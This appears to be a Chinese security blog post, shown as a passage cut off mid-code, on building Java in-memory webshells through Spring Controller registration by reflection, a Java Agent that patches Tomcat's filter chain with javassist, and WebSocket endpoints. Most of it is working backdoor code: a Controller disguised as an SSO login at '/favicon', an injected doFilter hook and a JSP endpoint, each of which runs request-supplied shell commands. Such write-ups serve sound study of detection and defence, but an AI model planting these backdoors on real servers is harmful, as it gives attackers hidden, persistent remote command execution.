<h2 id="Spring-Controller-内存马"><a href="#Spring-Controller-内存马" class="headerlink" title="Spring Controller 内存马"></a>Spring Controller 内存马</h2><p>Servlet 能做内存马，Controller 当然也能做，不过 SpringMVC 可以在运行时动态添加 Controller 吗？答案是肯定的。在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping，在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。这里使用 spring-webmvc-5.2.3 进行调试。</p>
<p>所谓 Spring Controller 的动态注册，就是对 <code>RequestMappingHandlerMapping</code> 注入的过程，如果你对 <code>SpringMVC</code> 比较了解，可以直接看<a href="https://blog.csdn.net/ywg_1994/article/details/112800703">这篇文章</a>然后再看我的注入代码，如果比较关注整个流程，可以接着向下看。</p>
<p>首先来看两个类：</p>
<ul>
<li><code>RequestMappingInfo</code>：一个封装类，对一次 http 请求中的相关信息进行封装。</li>
<li><code>HandlerMethod</code>：对 Controller 的处理请求方法的封装，里面包含了该方法所属的 bean、method、参数等对象。</li>
</ul>
<p>SpringMVC 初始化时，在每个容器的 bean 构造方法、属性设置之后，将会使用 <code>InitializingBean</code> 的 <code>afterPropertiesSet</code> 方法进行 Bean 的初始化操作，其中实现类 <code>RequestMappingHandlerMapping</code> 用来处理具有 <code>@Controller</code> 注解类中的方法级别的 <code>@RequestMapping</code> 以及 <code>RequestMappingInfo</code> 实例的创建。看一下具体的是怎么创建的。</p>
<p>它的 <code>afterPropertiesSet</code> 方法初始化了 <code>RequestMappingInfo.BuilderConfiguration</code> 这个配置类，然后调用了其父类 <code>AbstractHandlerMethodMapping</code> 的 <code>afterPropertiesSet</code> 方法。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714142226.png"></p>
<p>这个方法调用了 <code>initHandlerMethods</code> 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 <code>processCandidateBean</code> 方法处理 Bean。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714142409.png"></p>
<p><code>processCandidateBean</code> 方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714142448.png"></p>
<p><code>isHandler</code> 方法判断当前 bean 定义是否带有 <code>Controller</code> 或 <code>RequestMapping</code> 注解。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714142557.png"></p>
<p><code>detectHandlerMethods</code> 查找 handler methods 并注册。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownQQ%E6%88%AA%E5%9B%BE20220714142625.png"></p>
<p>这部分有两个关键功能，一个是 getMappingForMethod 方法根据 handler method 创建RequestMappingInfo 对象，一个是 registerHandlerMethod 方法将 handler method 与访问的 创建 RequestMappingInfo 进行相关映射。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownQQ%E6%88%AA%E5%9B%BE20220714142625.png"></p>
<p>这里我们看到，是调用了 MappingRegistry 的 register 方法，这个方法将一些关键信息进行包装、处理和储存。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714142852.png"></p>
<p>关键信息储存位置如下：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714142936.png"></p>
<p>以上就是整个注册流程，那当一次请求进来时的查找流程呢？在 <code>AbstractHandlerMethodMapping</code> 的 <code>lookupHandlerMethod</code> 方法：</p>
<ul>
<li>在 <code>MappingRegistry.urlLookup</code> 中获取直接匹配的 <code>RequestMappingInfos</code></li>
<li>如果没有，则遍历所有的 <code>MappingRegistry.mappingLookup</code> 中保存的 <code>RequestMappingInfos</code></li>
<li>获取最佳匹配的 <code>RequestMappingInfo</code> 对应的 <code>HandlerMethod</code></li>
</ul>
<p>上述的流程和较详细的流程描述在<a href="https://www.cnblogs.com/w-y-c-m/p/8416630.html">这篇文章</a>中可以查看，由于我这里使用的版本与之不同，所以一些代码和细节可能不同。</p>
<p>那接下来就是动态注册 Controller 了，<a href="https://landgrey.me/blog/12/">LandGrey 师傅在他的文章</a>中列举了几种可用来添加的接口，其实本章上都是调用之前我们提到的 <code>MappingRegistry</code> 的 register 方法。</p>
<p>和 Servlet 的添加较为类似的是，重点需要添加的就是访问 url 与 RequestMappingInfo 的映射，以及是 RequestMappingInfo 与 HandlerMethod 的映射。</p>
<p>这里也可以不使用 LandGrey 师傅提到的接口，而是直接使用 MappingRegistry 的 register 方法来添加，当然，同样可以通过自己实现逻辑，通过反射直接写进重要位置，不使用 Spring 提供的接口。</p>
<p>具体实现如下：</p>
<p>这里在强调一下，不需要强制使用 <code>@RequestMapping</code> 注解定义 URL 地址和 HTTP 方法，其余两种手动注册 controller 的方法都必须要在 controller 中使用@RequestMapping 注解 。</p>
<p><font color="red">除此之外，将 Webshell 的代码逻辑写在主要的 Controller 方法中即可</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.landgrey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SSOLogin</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/favicon&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反射实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.su18.memshell.spring.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.su18.memshell.spring.controller.DynamicUtils.CONTROLLER_CLASS_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问此接口动态添加 controller</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> su18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/add&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping()</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">String</span> <span class="variable">controllerPath</span> <span class="operator">=</span> <span class="string">&quot;/su18&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取当前应用上下文</span></span><br><span class="line">		<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 通过 context 获取 RequestMappingHandlerMapping 对象</span></span><br><span class="line">		<span class="type">RequestMappingHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取父类的 MappingRegistry 属性</span></span><br><span class="line">		<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;mappingRegistry&quot;</span>);</span><br><span class="line">		f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="type">Object</span> <span class="variable">mappingRegistry</span> <span class="operator">=</span> f.get(mapping);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 反射调用 MappingRegistry 的 register 方法</span></span><br><span class="line">		Class&lt;?&gt; c = Class.forName(<span class="string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;</span>);</span><br><span class="line"></span><br><span class="line">		Method[] ms = c.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 判断当前路径是否已经添加</span></span><br><span class="line">		<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;urlLookup&quot;</span>);</span><br><span class="line">		field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">		Map&lt;String, Object&gt; urlLookup = (Map&lt;String, Object&gt;) field.get(mappingRegistry);</span><br><span class="line">		<span class="keyword">for</span> (String urlPath : urlLookup.keySet()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (controllerPath.equals(urlPath)) &#123;</span><br><span class="line">				response.getWriter().println(<span class="string">&quot;controller url path exist already&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 初始化一些注册需要的信息</span></span><br><span class="line">		<span class="type">PatternsRequestCondition</span>       <span class="variable">url</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(controllerPath);</span><br><span class="line">		<span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">		<span class="type">RequestMappingInfo</span>             <span class="variable">info</span>      <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt; myClass = DynamicUtils.getClass(CONTROLLER_CLASS_STRING);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (Method method : ms) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="string">&quot;register&quot;</span>.equals(method.getName())) &#123;</span><br><span class="line">				<span class="comment">// 反射调用 MappingRegistry 的 register 方法注册 TestController 的 index</span></span><br><span class="line">				method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">				method.invoke(mappingRegistry, info, myClass.newInstance(), myClass.getMethods()[<span class="number">0</span>]);</span><br><span class="line">				response.getWriter().println(<span class="string">&quot;spring controller add&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="基于Java-Agent实现的WebShell"><a href="#基于Java-Agent实现的WebShell" class="headerlink" title="基于Java Agent实现的WebShell"></a>基于Java Agent实现的WebShell</h1><p>Java Agent 技术我这里不再介绍，我写过一篇学习笔记，总体来说就是可以使用 Instrumentation 提供的 retransform 或 redefine 来动态修改 JVM 中 class 的一种字节码增强技术，可以直接理解为，这是 JVM 层面的一个拦截器。这里直接来看一下内存马的实现。</p>
<h2 id="简单示例1"><a href="#简单示例1" class="headerlink" title="简单示例1"></a>简单示例1</h2><p>这里先找到我们要注入的类，这里要注入到 <code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code> ，这个类其实在filter中也有提到，它有ServletRequest和ServletResponse两个参数，里面封装了请求的request和response，所以在这里拦截的话，它一定会执行，能控制所有的请求和响应，并且不影响正常业务。大体实现的思路就是，生成MyAgent.jar，然后编写java利用代码来使其加载进去</p>
<p>(网上挺多通过改cc链)</p>
<p>编写AgentMain.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写DefineTransformer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打包生成agent.jar包，然后利用cc链。</p>
<h2 id="冰蝎作者-rebeyond-师傅的思路"><a href="#冰蝎作者-rebeyond-师傅的思路" class="headerlink" title="冰蝎作者 rebeyond 师傅的思路"></a>冰蝎作者 rebeyond 师傅的思路</h2><p>他的项目提出了这种想法，在这个项目中，他 hook 了 Tomcat 的 ApplicationFilterChain 的 internalDoFilter方法。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714164256.png"></p>
<p>使用 javassist 在其中插入了自己的判断逻辑，也就是项目的 ReadMe 中 usage 中提供的一些逻辑。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714164512.png"></p>
<p>也就是说在 Tomcat 调用 ApplicationFilterChain 对请求调用 filter 链处理之前加入恶意逻辑。</p>
<p>师傅在冰蝎中同样加入了内存马的功能的实现，调用代码位置 <code>net.rebeyond.behinder.payload.java.MemShell</code>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714165603.png"></p>
<p>agent 端在 net&#x2F;rebeyond&#x2F;behinder&#x2F;resource&#x2F;tools 中，应该是根据不同的类型会上传不同的注入包。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714165639.png"></p>
<p>但是这次不再 Hook Tomcat 的方法，而是选择 Hook 了 Servlet-API 中更具有通用性的 <code>javax.servlet.http.HttpServlet</code> 的 service 方法，如果检测出是 Weblogic，则选择 Hook <code>weblogic.servlet.internal.ServletStubImpl</code> 方法。</p>
<p>那么说到这里，使用插桩技术的 RASP、IAST 的使用者一下就可以明白：如果都能做到这一步了，能玩的就太多了。能下的 Hook 点太多，能玩的姿势也太多了。</p>
<h1 id="WebSocket-内存马"><a href="#WebSocket-内存马" class="headerlink" title="WebSocket 内存马"></a>WebSocket 内存马</h1><h2 id="WebSocket简介"><a href="#WebSocket简介" class="headerlink" title="WebSocket简介"></a>WebSocket简介</h2><p>WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。</p>
<h2 id="版本要求"><a href="#版本要求" class="headerlink" title="版本要求"></a>版本要求</h2><p>Tomcat7.0.47+</p>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="注解方式"><a href="#注解方式" class="headerlink" title="注解方式"></a>注解方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/ws/&#123;userId&#125;&quot;, encoders = &#123;MessageEncoder.class&#125;, decoders = &#123;MessageDecoder.class&#125;, configurator = MyServerConfigurator.class)</span></span><br></pre></td></tr></table></figure>

<p>Tomcat在启动时会默认通过 WsSci 内的 ServletContainerInitializer 初始化 Listener 和 servlet。然后再扫描 classpath下带有 @ServerEndpoint注解的类进行 addEndpoint加入websocket服务</p>
<p>所以即使 Tomcat 没有扫描到 @ServerEndpoint注解的类，也会进行Listener和 servlet注册，这就是为什么所有Tomcat启动都能在memshell scanner内看到WsFilter</p>
<h3 id="继承抽象类Endpoint方式"><a href="#继承抽象类Endpoint方式" class="headerlink" title="继承抽象类Endpoint方式"></a>继承抽象类Endpoint方式</h3><p>继承抽象类 Endpoint方式比加注解 @ServerEndpoint方式更麻烦，主要是需要自己实现 MessageHandler和 ServerApplicationConfig。@ServerEndpoint的话都是使用默认的，原理上差不多，只是注解更自动化，更简洁</p>
<p>可以用代码更方便的控制 ServerEndpointConfig 内的属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, <span class="string">&quot;/ws/&#123;userId&#125;&quot;</span>).decoders(decoderList).encoders(encoderList).configurator(<span class="keyword">new</span> <span class="title class_">MyServerConfigurator</span>()).build();</span><br></pre></td></tr></table></figure>

<h3 id="websocket内存马实现方法"><a href="#websocket内存马实现方法" class="headerlink" title="websocket内存马实现方法"></a>websocket内存马实现方法</h3><p>之前提到过 Tomcat 在启动时会默认通过 WsSci 内的 ServletContainerInitializer 初始化 Listener 和 servlet。然后再扫描 classpath下带有 @ServerEndpoint注解的类进行 addEndpoint加入websocket服务</p>
<p>那如果在服务启动后我们再 addEndpoint 加入websocket服务行不行呢？答案是肯定的，而且非常简单只需要三步。创建一个ServerEndpointConfig，获取ws ServerContainer，加入 ServerEndpointConfig，即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServerEndpointConfig</span> <span class="variable">config</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(EndpointInject.class, <span class="string">&quot;/ws&quot;</span>).build();</span><br><span class="line"><span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line">container.addEndpoint(config);</span><br></pre></td></tr></table></figure>

<p>上传该文件实现内存马</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">cmdEndpoint</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            session.addMessageHandler(<span class="keyword">new</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isWindows</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>);</span><br><span class="line">                        Process p;</span><br><span class="line">                        <span class="keyword">if</span> (isWindows) &#123;</span><br><span class="line">                            p = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, s&#125;);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            p = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, s&#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">                        <span 